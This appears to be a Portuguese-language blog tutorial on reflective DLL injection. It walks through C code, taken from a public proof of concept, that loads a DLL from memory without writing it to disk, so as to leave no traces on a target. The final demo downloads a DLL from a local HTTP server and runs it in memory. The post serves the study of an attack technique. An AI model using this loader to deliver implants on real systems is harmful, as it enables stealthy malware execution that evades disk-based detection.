---
layout: post
title: reflective dll injection
date: 2025-11-20
description: malware windows 
categories: malware windows 
tags: malware windows
---

* content
{:toc}



# REflective DLL Injection

- "*Reflective DLL injection is a technique that allows an attacker to inject a DLL's into a victim process from memory rather than disk.*"


Reflective DLL Injection é uma tecnica que permite carregar uma dll na memória de um processo sem precisar escrever a dll em disco. A ideia é não deixar rastros na hora de executar algum implant no alvo. Essa tecnica funciona literalmente da mesma forma que o loader do windows quando carrega uma dll em memória, porém no código tudo é feito manualmente, a alocação de memória, parse de arquivo e etc.

O código da poc é um pouco grande então vou dividir em algumas partes para que o entendimento seja melhor. Cada parte do código é uma curva de aprendizado principalmente se você não está familiarizado com o Formato PE. Sendo assim, cada parte do código pode ser usado para aprendizado individual sobre a parte especifica do parse de binario. Vou deixar referencias em cada umas delas.

1. Obter os bytes da DLL e armazenar em memória
2. Alocar memeória
3. Copiar PE headers e sections
4. Image Base Relocations
5. Resolvendo Import Address Table


## Armazenar a DLL em memória (sem escrever no disco)

O Delivery da dll pode ser feito de varias formas, a mais comum seria servir por algum web server, requisitar com um client http e depois armazenar em uma variavel do powershell por exemplo. Seja qual for o delivery você precisa ter em mente que a ideia é não deixar samples na maquina alvo. Como essa parte não é o foco vou deixar em aberto.

Na poc o delivery é um client http em c, primeiro cria um socket para se conectar ao server depois manda um GET e faz parse do tamanho da response. Para finalizar um buffer é criado para guardar a dll temporariamente. Com a dll em memória, os bytes são passados para a função ```reflective_loader```.

- [https://github.com/trustedsec/TCS_InjectionTechniques/blob/main/techniques/injectionTechniques/reflectiveDLL/poc/reflective_dll.c])https://github.com/trustedsec/TCS_InjectionTechniques/blob/main/techniques/injectionTechniques/reflectiveDLL/poc/reflective_dll.c)
- [https://trustedsec.com/blog/loading-dlls-reflections](https://trustedsec.com/blog/loading-dlls-reflections)


## Alocando memória para a dll

Depois de ter acesso a DLL e armazenar os bytes em memória nós precisamos alocar memória com espaço e permissões (RWX) necessarias. Em variantes de código são usadas algumas funções diferentes, nesse exemplo foi usado a ```VirtualAlloc```  para deixar mais simples. 

Para alocar a quantidade necessaria de memória precisamos saber o tamanho da DLL que será injetada. Também em algumas variantes de código são usadas funções diferentes para isso, por exemplo, na versão original da tecnica o autor usou a ```GetFileSize```, mas nesse exemplo vamos ver uma abordagem que extrai os valores ```ImageBase``` e ```SizeOfImage``` do Optional Header da DLL.


```c
	// get pointers to in-memory DLL headers
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);

    ...

    SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

	// allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere
	LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

     // get delta between this module's image base and the DLL that was read into memory
    DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

    // copy over DLL image headers to the newly allocated space for the DLL
    memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);
```


O trecho de código acima é como a memória será alocada para receber a DLL. Primeiro os endereços (pointers) que apontam para os PE Headers da DLL são salvos e logo depois são usados para extrair o valor do campo ```SizeOfImage``` que é basicamente o tamanho da DLL (em bytes), e também o valor do campo ```ImageBase``` que armazena o endereço virtual padrão (preferred address) para o qual uma DLL é carregada em memória. Esse geralmente é um endereço vazio usado pelo loader do windows para evitar problemas ao carregar dll's. 

![sizeofimage](/img/sizeofimage.png)

Se não puder usar esse endereço o windows usa a tabela de relocations e carrega em outro lugar, porém na poc é necessario fazer isso "manualmente", então a diferença do "preferred address" precisa ser calculada. Essa diferença é usada depois para resolver as ```relocations```. Na variavel ```deltaImageBsae``` podemos ver isso subtraindo o endereço retornado pela VirtualAlloc com o preferred address atual da dll (de quando a dll é carregada).

Por último os bytes dll são copiados para a area de memória alocada com a função ```memcpy```. No último parâmetro da função (número de bytes a ser copiado) foi usado o campo ```SizeOfHeaders``` que é o "size of image" ou o tamanho combinado de todos os headers e sections.

![sizeofheaders](/img/sizeofheaders.png)


- [https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-image-only](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-image-only)
- [https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header64](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header64)
- [https://0xrick.github.io/win-internals/pe4/](https://0xrick.github.io/win-internals/pe4/)


## Copiando PE sections headers


Logo após são copiados os headers e sections da dll no espaço de memória alocado.

```c
    // copy over DLL image sections to the newly allocated space for the DLL
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
        LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
        memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
        section++;
    }
```

No código acima primeiro a variavel ```section``` armazena o endereço do inicio da section table (usando a macro ```ÌMAGE_FISRT_SECION``` para pular o Optional Header) que é usado em um for loop que iterar entre as seções. 

No for loop a variavel ```sectionDestination``` armazena o endereço do primeiro byte da section table, extraindo o campo VirtualAddress, de quando ela é carragada em memória e soma com endereço base onde a memória foi alocada (resultando onde os bytes da seção devem ser copiados).

![virtualaddress](/img/virtualaddress.png)

Em seguida a variavel ```sectionBytes``` armazena basicamente o endereço do inicio dos dados de cada seção (PointerToRawData) + o endereço dos bytes brutos da dll (resultando no endereço das seções da dll carregada).

![pointertorawdata](/img/pointertorawdata.png)

E por último copia as seções para a memória alocada (```SizeOfRawData``` é o tamanho dos dados de cada seção). Fazendo isso o for loop ira percorrer toda a section table e copia-la para a memória alocada.


- [https://0xrick.github.io/win-internals/pe5/](https://0xrick.github.io/win-internals/pe5/)
- [https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#section-table-section-headers](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#section-table-section-headers)
- [https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header)



## Image Base Relacations


```c
    // perform image base relocations
    IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
```

Primeiro acessa o header que contem o ```assumed base address``` da ```Relocation Table``` (o endereço que o compilador adiciona na dll) e salva na varialvel ```relocations```. Na linha abaixo é calculado o endereço atual (endereço de quando é carregado em memória) da Relocation Table somando o endereço "estatico" ao endereço base da dll carregada em memória.

```DataDirectory``` é uma struct que guarda o endereço (VirtualAddress) e o tamanho (Size) de uma tabela. Toda tabela tem esse campo.
- [https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory)

- [https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header64](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header64)


```c
    DWORD relocationsProcessed = 0;

    while (relocationsProcessed < relocations.Size) 
        {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
            relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
            DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
    ...
            
```

Aqui acontece um loop que itera entre os ```relocation blocks```. A condição do loop é a variavel relocationsProcessed que é incrementado a cada volta. O loop passa por todos os relocation blocks e salvas todas as ```relocations entries``` (que são basicamente os endereços individuais).

```c
        for (DWORD i = 0; i < relocationsCount; i++)
        {
            relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

            if (relocationEntries[i].Type == 0)
            {
                continue;
            }

            DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
            DWORD_PTR addressToPatch = 0;
            ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
            addressToPatch += deltaImageBase;
            memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
        }

```

Depois de separar todas as Entries elas são "filtradas" por ```type = 0``` (na doc da microsoft diz que o type 0 é skippado). Logo depois é calculado o RVA das relocations somando o endereço da tabela com os offsets das entries, e então por último pega os endereços resolvidos armazena na variavel ```addressToPath```, adiciona os endereços na base da dll em memória (deltaImageBase calculado anteriormente), por fim copia os endereços para a dll carregada em memória.

- [https://0xrick.github.io/win-internals/pe7/](https://0xrick.github.io/win-internals/pe7/)
- [https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#relocation](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#relocation)
- [https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-reloc-section-image-only](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-reloc-section-image-only)


## Resolvendo a Import Address Table


```c
// resolve import address table
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
    LPCSTR libraryName = "";
    HMODULE library = NULL;
```

No começo desse trecho do código primeiro é pego o endereço da IAT na DLL, mais especificamente é um ponteiro para a "data section" ```.idata```. A linha abaixo calcula o endereço do começo dos dados de imports (```ÌMAGE_IMPORT_DESCRIPTOR```) somando o endereço da IAT com o base da DLL em memória. Nesse endereço começa todos os nomes das dlls importadas.

- [https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/pe-file-header-parser-in-c++?q=relocations#pimage_import_descriptor](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/pe-file-header-parser-in-c++?q=relocations#pimage_import_descriptor)
- [https://0xrick.github.io/win-internals/pe6/](https://0xrick.github.io/win-internals/pe6/)
- [https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-idata-section](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-idata-section)


```c
    while (importDescriptor->Name != NULL)
    {
        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
        library = LoadLibraryA(libraryName);
```

O while loop acima itera entre os nomes das dlls (até chegar no fim da tabela que é nulo) e calcula os endereços delas somando com o endereço base da dll em memória. 

Depois usa a função ```LoadLibrary``` para carrega-las no processo atual e salva os endereços na variavel ```library```.
 

```c
        if (library)
        {
            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);
```

Em seguida depois do if testar se há algo na variavel library (dll carregada com sucesso), é calculado o endereço da ```IMAGE_THUNK_DATA``` struct a.k.a ```Thunk```'s que são cada função que a dll usa/importa. O calculo é feito somando a base da dll em memória com o RVA da IAT de cada dll carregada, sendo assim, se a dll for carregada com sucesso o fluxo segue para processar as funções das dlls...


```c

            while (thunk->u1.AddressOfData != NULL)
            {
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
                    DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
                    thunk->u1.Function = functionAddress;
                }
                ++thunk;
            }
        }

        importDescriptor++;
    }
```


Seguindo com o próxmo while loop, ele segue a execução se o virtual address de um thunk não for nulo (```thunk->u1.AddressOfData != NULL```). Depois do while o if verifica se o thunk/função é importado por ```ordinal type``` ou se não (else) é importado por nome.  

A importação de funções por nome é simplemente por nome :), na struct de cada thunk vai ter os campos Hint e Name, o Hint é usado como index e o Name é o nome função que será importada.

![importbyname](/img/importbyname.png)

Agora a importação por Ordinal é usado apenas um número (ou um ASCII name) para indicar a função.

Voltando para o if, se o import da função for ```IMAGE_SNAP_BY_ORDINAL``` é extraido o campo Ordinal da struct e passado para a função ```GetProcAddress``` que vai pegar o endereço da função em memória.

No final de cada loop tem ```++thunk``` para passar para o proxmo thunk e um ```importDescriptor++``` para passar para a próxima dll carragada.


## Executando a Dll

```c
// execute the loaded DLL
    void (*DLLEntry)(HINSTANCE, DWORD, LPVOID) = (DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    (*DLLEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);

    return 0;
}
```

A parte final é simples, uma ```function pointer``` (ponteiro que aponta para um função) é criado somando o endereço base com o endereço do ```EntryPoint``` da dll. Basicamente essa function pointer está apontando para a ```DllMain``` que toda dll tem e da mesma forma os argumentos são passados chamando a DllMain com PROCESS_ATTACH.


## DEMO

Para a demo fazer algo simples apenas pra ilustrar como funciona. Sem bypass de AV, sem ofuscação nem nada assim, somente a tecnica sendo executada. 

A dll também é simples, um MsgBox que é melhor pra ver o resultado. 


1. Compile a poc 

- https://github.com/trustedsec/TCS_InjectionTechniques/blob/main/techniques/injectionTechniques/reflectiveDLL/poc/build.sh

```└─$ x86_64-w64-mingw32-gcc reflective_dll.c -w -masm=intel -fpermissive -static -lntdll -lpsapi -lws2_32 -Wl,--subsystem,console -o reflect.exe```


2. Start em um http server para servir a dll

```
└─$ sudo python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

3. Dll MsgBox no VisualStudio

```Create New Project --> Dynamic-Link Library (c++) --> ...```

(dll imagem)


4. Ajuste a url para get na dll

```c
int main()
{

    char* dllBytes = NULL;

    dllBytes = DownloadToBuffer("http://192.168.0.1/TestLib.dll");
    reflective_loader( dllBytes );

    free(dllBytes);

    return 0;
}
```

5. running poc

![demo1](/img/demo1.png)